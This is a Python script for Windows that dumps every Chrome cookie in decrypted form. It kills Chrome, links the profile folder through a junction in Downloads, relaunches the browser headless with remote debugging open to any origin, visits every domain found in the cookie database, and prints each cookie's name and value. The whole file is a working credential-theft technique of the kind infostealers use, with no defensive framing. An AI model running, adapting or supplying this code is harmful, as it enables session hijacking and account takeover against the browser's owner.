import winreg
import requests
import websocket
import json
import os
import subprocess
import time
import sqlite3

DEBUG_PORT = 5000


def get_chrome_exe_path():
    paths_to_try = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"),
    ]

    for root, subkey in paths_to_try:
        try:
            with winreg.OpenKey(root, subkey) as key:
                value, _ = winreg.QueryValueEx(key, None)
                return value
        except FileNotFoundError:
            continue

    return None


def get_chrome_user_data_dir():
    local_app_data = os.environ.get("LOCALAPPDATA")
    if not local_app_data:
        return None
    return os.path.join(local_app_data, "Google", "Chrome", "User Data")


def get_chrome_cookies_path(profile="Default"):
    user_data_dir = get_chrome_user_data_dir()
    if not user_data_dir:
        return None
    return os.path.join(user_data_dir, profile, "Network", "Cookies")


def get_browser_ws_url(debug_port):
    resp = requests.get(f"http://localhost:{debug_port}/json/version")
    return resp.json()["webSocketDebuggerUrl"]


def get_devtools_targets(debug_port):
    resp = requests.get(f"http://localhost:{debug_port}/json")
    return resp.json()


def connect_websocket(ws_url):
    return websocket.create_connection(ws_url)


def navigate_and_fetch_cookies(ws, url, domain):
    """Navigate to URL and fetch cookies only for that domain."""
    msg_id = 1

    # Navigate to the page
    ws.send(json.dumps({
        "id": msg_id,
        "method": "Page.navigate",
        "params": {"url": url}
    }))

    # Wait for navigation response
    while True:
        response = json.loads(ws.recv())
        if response.get("id") == msg_id:
            break

    time.sleep(2)  # Let the page settle

    # Fetch cookies for this specific URL
    msg_id += 1
    ws.send(json.dumps({
        "id": msg_id,
        "method": "Network.getCookies",
        "params": {"urls": [url]}
    }))

    while True:
        response = json.loads(ws.recv())
        if response.get("id") == msg_id:
            if "error" in response:
                raise Exception(f"DevTools error: {response['error']}")
            return response["result"]["cookies"]


def print_cookies(domain, cookies):
    if not cookies:
        print(f"  (no cookies returned)")
        return
    for c in cookies:
        print(f"  {c['domain']} | {c['name']} = {c['value']}")
    print(f"  => {len(cookies)} cookies")


def create_junction(src, dst):
    if os.path.exists(dst):
        return
    cmd = f'mklink /J "{dst}" "{src}"'
    subprocess.run(cmd, shell=True, check=True)


def read_cookies_from_db(db_path):
    if not os.path.exists(db_path):
        raise FileNotFoundError("Cookies DB not found")

    temp_path = db_path + "_copy"
    with open(db_path, "rb") as src, open(temp_path, "wb") as dst:
        dst.write(src.read())

    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT host_key, name, path, encrypted_value, expires_utc
        FROM cookies
    """)

    cookies = []
    for row in cursor.fetchall():
        cookies.append({
            "domain": row[0],
            "name": row[1],
            "path": row[2],
            "encrypted_value": row[3],
            "expires": row[4]
        })

    conn.close()
    os.remove(temp_path)
    return cookies


def get_downloads_dir():
    return os.path.join(os.path.expanduser("~"), "Downloads")


def get_junction_user_data_dir():
    return os.path.join(get_downloads_dir(), "ChromeData")


def get_page_target_ws(debug_port):
    """Get a page-level WebSocket URL (needed for Page.navigate + Network.getCookies)."""
    targets = get_devtools_targets(debug_port)
    for t in targets:
        if t.get("type") == "page":
            return t["webSocketDebuggerUrl"]
    raise Exception("No page target found")


def main():
    chrome_path = get_chrome_exe_path()
    print("Chrome EXE:", chrome_path)

    cookies_path = get_chrome_cookies_path()
    print("Cookies path:", cookies_path)

    # Step 1: Kill any running Chrome instances
    print("\nClosing Chrome...")
    subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], capture_output=True)
    time.sleep(2)

    # Step 2: Create junction in Downloads pointing to real Chrome user data dir
    real_user_data_dir = get_chrome_user_data_dir()
    junction_dir = get_junction_user_data_dir()
    print(f"\nCreating junction: {junction_dir} -> {real_user_data_dir}")
    create_junction(real_user_data_dir, junction_dir)

    # Step 3: Read cookies from SQLite DB and extract unique domains
    try:
        db_cookies = read_cookies_from_db(cookies_path)
        unique_domains = list({c["domain"].lstrip(".") for c in db_cookies})
        print(f"\n[Unique Domains] ({len(unique_domains)} found)")
        for domain in unique_domains:
            print(f"  {domain}")
    except Exception as e:
        print("SQLite read failed:", e)
        return

    if not unique_domains:
        print("No domains found, exiting.")
        return

    # Step 4: Launch Chrome with remote debugging
    print(f"\nLaunching Chrome with debug port {DEBUG_PORT}...")
    subprocess.Popen([
        chrome_path,
        f"--remote-debugging-port={DEBUG_PORT}",
        f"--user-data-dir={junction_dir}",
        "--remote-allow-origins=*",
        "--profile-directory=Default",
        "--headless",
    ])
    time.sleep(3)

    # Step 5: Iterate domains, navigate, fetch cookies
    all_results = {}

    try:
        ws_url = get_page_target_ws(DEBUG_PORT)
        print(f"\nConnected to page target: {ws_url}")
        ws = connect_websocket(ws_url)

        for domain in unique_domains:
            url = f"https://{domain}"
            print(f"\n[{domain}] Navigating to {url} ...")
            try:
                cookies = navigate_and_fetch_cookies(ws, url, domain)
                all_results[domain] = cookies
                print_cookies(domain, cookies)
            except Exception as e:
                print(f"  Failed: {e}")
                all_results[domain] = []

        ws.close()

    except Exception as e:
        print("DevTools connection failed:", e)
        return

    # Summary
    print("\n=== SUMMARY ===")
    total = 0
    for domain, cookies in all_results.items():
        print(f"  {domain}: {len(cookies)} cookies")
        total += len(cookies)
    print(f"Total: {total} cookies across {len(all_results)} domains")


if __name__ == "__main__":
    main()